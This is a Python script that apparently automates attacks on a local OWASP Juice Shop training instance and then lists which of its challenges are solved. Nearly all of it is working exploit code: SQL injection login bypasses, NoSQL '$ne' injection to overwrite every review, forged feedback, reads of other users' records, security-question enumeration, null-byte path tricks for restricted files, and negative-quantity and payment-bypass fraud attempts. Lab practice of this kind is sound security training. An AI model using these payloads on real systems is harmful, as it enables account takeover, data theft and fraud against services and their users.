#!/usr/bin/env python3
import json, sys, urllib.request, urllib.parse, urllib.error

BASE = "http://localhost:3000"

def req(method, path, data=None, token=None, ctype="application/json"):
    url = BASE + path
    headers = {}
    body = None
    if token: headers["Authorization"] = f"Bearer {token}"
    if data is not None:
        body = json.dumps(data).encode() if not isinstance(data,(bytes,str)) else (data if isinstance(data,bytes) else data.encode())
        headers["Content-Type"] = ctype
    r = urllib.request.Request(url, data=body, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r) as resp:
            return resp.status, resp.read().decode("utf-8","replace"), dict(resp.headers)
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8","replace"), dict(e.headers)
    except Exception as e:
        return -1, str(e), {}

def j(method, path, data=None, token=None):
    st,t,h = req(method,path,data,token)
    try: return st, json.loads(t), h
    except Exception: return st, t, h

def login(email, pw="x"):
    st,d,_ = j("POST","/rest/user/login",{"email":email,"password":pw})
    try: return d["authentication"]["token"]
    except Exception: return None

admin_tok = login("' or 1=1--")
print("admin:", bool(admin_tok))

# captcha fields
st,cap,_ = j("GET","/rest/captcha")
print("captcha:", cap)

# Forged Feedback (valid captcha, other UserId)
cid = cap.get("captchaId"); cval = cap.get("answer")
if cid:
    st,d,_ = j("POST","/api/Feedbacks",{"comment":"forged by red team","rating":1,"UserId":1,"captchaId":cid,"captcha":cval})
    print("ForgedFeedback:",st,str(d)[:200])

# Forged Review variants
st,d,_ = j("GET","/rest/products/1/reviews")
print("reviews get:",st,str(d)[:200])
rid = d["data"][0]["_id"] if isinstance(d,dict) and d.get("data") else None
for path,m,body in [
    ("/rest/products/reviews","PUT",{"id":rid,"message":"hacked review"}),
    ("/rest/products/reviews/","PUT",{"id":rid,"message":"hacked review"}),
    ("/rest/products/1/reviews","PUT",{"id":rid,"message":"hacked review"}),
    ("/rest/products/reviews","PATCH",{"id":rid,"message":"hacked review"}),
]:
    st,d,_ = j(m,path,body)
    print("FR",m,path,"->",st,str(d)[:150])

# NoSQL Manipulation: multi-review update
st,d,_ = j("PUT","/rest/products/reviews",{"id":{"$ne":-1},"message":"nosql pwned"})
print("NoSQL manip:",st,str(d)[:200])
st,d,_ = j("PATCH","/rest/products/reviews",{"id":{"$ne":-1},"message":"nosql pwned"})
print("NoSQL manip patch:",st,str(d)[:200])

# Password Hash Leak: try endpoints
st,d,_ = j("GET","/rest/user/whoami",token=admin_tok)
print("whoami tok:",st,str(d)[:200])
st,d,_ = j("GET","/api/Users/1",token=admin_tok)
print("Users/1:",st,str(d)[:300])
st,d,h = j("GET","/rest/user/whoami",token=admin_tok)
print("whoami headers ACAO:",h.get("Access-Control-Allow-Origin"))
st,d,h = j("GET","/rest/user/authentication-details/",token=admin_tok)
print("auth-details:",st,str(d)[:200])

# Email Leak: cross-domain check headers
st,d,h = j("GET","/api/Users/",token=admin_tok)
print("Users ACAO:",h.get("Access-Control-Allow-Origin"),"ACAC:",h.get("Access-Control-Allow-Credentials"))
st,d,h = j("GET","/rest/user/whoami")
print("whoami noauth:",st,str(d)[:150],"ACAO:",h.get("Access-Control-Allow-Origin"))

# Login Bender SQLi
b_tok = login("' or email='bender@juice-sh.op'--")
print("bender sqli:", bool(b_tok))

# Bjoern security question
st,d,_ = j("GET","/rest/user/security-question?email=bjoern@juice-sh.op")
print("bjoern q:",st,str(d)[:200])
st,d,_ = j("GET","/rest/user/security-question?email=jim@juice-sh.op")
print("jim q:",st,str(d)[:200])
st,d,_ = j("GET","/rest/user/security-question?email=bender@juice-sh.op")
print("bender q:",st,str(d)[:200])
st,d,_ = j("GET","/rest/user/security-question?email=uvogin@juice-sh.op")
print("uvogin q:",st,str(d)[:200])
st,d,_ = j("GET","/rest/user/security-question?email=morty@juice-sh.op")
print("morty q:",st,str(d)[:200])

# Deprecated B2B variants
for p in ["/rest/b2b/v1/orders","/b2b/v1/orders","/b2b/v2/orders","/rest/b2b/orders"]:
    st,d,_ = j("POST",p,{"orderLinesData":[{"productId":1,"quantity":1,"customerReference":"x"}]})
    print("B2B",p,"->",st,str(d)[:120])

# Easter egg variants
for p in ["/ftp/eastere.gg%2500.md","/ftp/eastere.gg%2500.pdf","/ftp/eastere.gg?","/assets/public/easteregg"]:
    st,t,_ = req("GET",p)
    print("EE",p,"->",st,len(t),t[:60].replace("\n"," "))

# Christmas special product
st,d,_ = j("GET","/rest/products/search?q=christmas")
print("xmas search:",st,str(d)[:300])
st,d,_ = j("GET","/api/Products/10")
print("prod10:",st,str(d)[:200])
st,d,_ = j("GET","/api/Products/24")
print("prod24:",st,str(d)[:200])

# Deluxe Fraud
st,d,_ = j("POST","/rest/deluxe-membership",{"paymentMode":"none"},token=admin_tok)
print("deluxe none:",st,str(d)[:200])
st,d,_ = j("POST","/rest/deluxe-membership",{"paymentMode":"card","paymentId":"x"},token=admin_tok)
print("deluxe card:",st,str(d)[:200])

# Payback: basket negative qty
st,d,_ = j("GET","/rest/basket/1",token=admin_tok)
print("basket:",st,str(d)[:200])
st,d,_ = j("POST","/api/BasketItems",{"ProductId":1,"BasketId":1,"quantity":-5},token=admin_tok)
print("basketitem neg:",st,str(d)[:200])

# GDPR Data Theft: IDOR other user data
st,d,_ = j("GET","/api/Users/3",token=admin_tok)
print("Users/3:",st,str(d)[:300])
st,d,_ = j("GET","/rest/user/data-export",token=admin_tok)
print("data-export get:",st,str(d)[:200])

st,_,_ = j("GET","/api/Challenges/")
solved={c["name"] for c in _["data"] if c.get("solved")}
print("SOLVED",len(solved))
for n in sorted(solved): print(" +",n)
